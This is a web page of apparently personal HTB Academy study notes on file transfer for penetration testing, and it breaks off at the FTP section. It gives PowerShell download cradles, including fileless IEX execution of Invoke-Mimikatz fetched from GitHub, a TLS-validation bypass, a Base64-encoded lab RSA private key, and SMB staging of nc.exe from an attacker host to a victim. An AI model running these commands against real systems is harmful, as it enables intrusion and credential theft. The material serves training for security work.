<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/HTB Academy/File transfers" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">File transfer | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/Hacking/HTB Academy/File transfers"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="File transfer | agalera.eu"><meta data-rh="true" name="description" content="Imagine the scenario where we need to download or upload files to a target machine. There are situations where the usual mechanism might be blocked, so it&#x27;s important to know many file transfer methods."><meta data-rh="true" property="og:description" content="Imagine the scenario where we need to download or upload files to a target machine. There are situations where the usual mechanism might be blocked, so it&#x27;s important to know many file transfer methods."><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/Hacking/HTB Academy/File transfers"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/File transfers" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/File transfers" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"File transfer","item":"https://www.agalera.eu/docs/Hacking/HTB Academy/File transfers"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.f96ca0f1.css">
<script src="/docs/assets/js/runtime~main.54376163.js" defer="defer"></script>
<script src="/docs/assets/js/main.870862b0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e">Flight Simulators</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Hacking/HTB Academy/File inclusion">Hacking</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">HTB Academy</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">File inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Hacking/HTB Academy/File transfers">File transfer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Active Directory">Introduction to Active Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Linux fundamentals">Linux fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/SQL injections">SQL injections</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Web fuzzing">Web fuzzing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Windows fundamentals">Windows fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/ffuf">Fuzzing with ffuf</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash">Language security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/playbooks/active-directory">Playbooks</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec">Tooling</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links">Useful links</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops">Write-ups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands">Linux</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome">Shortcuts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">Welcome</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HTB Academy</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">File transfer</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>File transfer</h1></header>
<p>Imagine the scenario where we need to download or upload files to a target machine. There are situations where the usual mechanism might be blocked, so it&#x27;s important to know many file transfer methods.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows">Windows<a href="#windows" class="hash-link" aria-label="Direct link to Windows" title="Direct link to Windows">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="base64">Base64<a href="#base64" class="hash-link" aria-label="Direct link to Base64" title="Direct link to Base64">​</a></h3>
<p>If the file is not very large, we can encoded in Base64 in one end, paste it in the console and decode it in the other side. It&#x27;s important to check the file hash are the same on both ends to ensure the transfer was successful.</p>
<p>For example, we are transfering an RSA key:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ md5sum id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4e301756a07ded0a2dd6953abf015278  id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ cat id_rsa |base64 -w 0;echo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=</span><br></span></code></pre></div></div>
<p>In Windows Powershell:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;))</span><br></span></code></pre></div></div>
<p>PS C:\htb&gt; Get-FileHash C:\Users\Public\id_rsa -Algorithm md5</p>
<p>Algorithm       Hash                                                                   Path</p>
<hr>
<p>MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa</p>
<p>This method might not always be possible. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters.</p>
<p>The same mechanism can be used to download or to upload files.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-web-downloads">Powershell Web Downloads<a href="#powershell-web-downloads" class="hash-link" aria-label="Direct link to Powershell Web Downloads" title="Direct link to Powershell Web Downloads">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="downloadfileasync">Downloadfile(Async)<a href="#downloadfileasync" class="hash-link" aria-label="Direct link to Downloadfile(Async)" title="Direct link to Downloadfile(Async)">​</a></h4>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; # Example: (New-Object Net.WebClient).DownloadFile(&#x27;&lt;Target File URL&gt;&#x27;,&#x27;&lt;Output File Name&gt;&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#x27;,&#x27;C:\Users\Public\Downloads\PowerView.ps1&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync(&#x27;&lt;Target File URL&gt;&#x27;,&#x27;&lt;Output File Name&gt;&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; (New-Object Net.WebClient).DownloadFileAsync(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#x27;, &#x27;C:\Users\Public\Downloads\PowerViewAsync.ps1&#x27;)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-downloadstring---fileless-method">PowerShell DownloadString - Fileless Method<a href="#powershell-downloadstring---fileless-method" class="hash-link" aria-label="Direct link to PowerShell DownloadString - Fileless Method" title="Direct link to PowerShell DownloadString - Fileless Method">​</a></h4>
<p>As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#x27;)</span><br></span></code></pre></div></div>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#x27;) | IEX</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-invoke-webrequest">PowerShell Invoke-WebRequest<a href="#powershell-invoke-webrequest" class="hash-link" aria-label="Direct link to PowerShell Invoke-WebRequest" title="Direct link to PowerShell Invoke-WebRequest">​</a></h4>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1</span><br></span></code></pre></div></div>
<p>You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.</p>
<p>There are two main sources of issues while downloading stuff from PowerShell:</p>
<ol>
<li>Internet Explorer is not yet configured. You can use <code>-UseBasicParsing</code> to bypass this.</li>
</ol>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX</span><br></span></code></pre></div></div>
<ol start="2">
<li>Errors related with SSL/TLS when certificate is not trusted. The solution is to execute this</li>
</ol>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="smb-downloads">SMB Downloads<a href="#smb-downloads" class="hash-link" aria-label="Direct link to SMB Downloads" title="Direct link to SMB Downloads">​</a></h3>
<p>You can use SMB server in the attacker machine:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo impacket-smbserver share -smb2support /tmp/smbshare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># with username/password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</span><br></span></code></pre></div></div>
<p>And use smb to download it in the victim:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">copy \\192.168.220.133\share\nc.exe</span><br></span></code></pre></div></div>
<p>With usernmae/password:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">net use n: \\192.168.220.133\share /user:test test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">copy n:\nc.exe</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ftp-downloads">FTP Downloads<a href="#ftp-downloads" class="hash-link" aria-label="Direct link to FTP Downloads" title="Direct link to FTP Downloads">​</a></h3>
<p>Run <code>pyftpdlib</code> FTP server in the attacker</p>
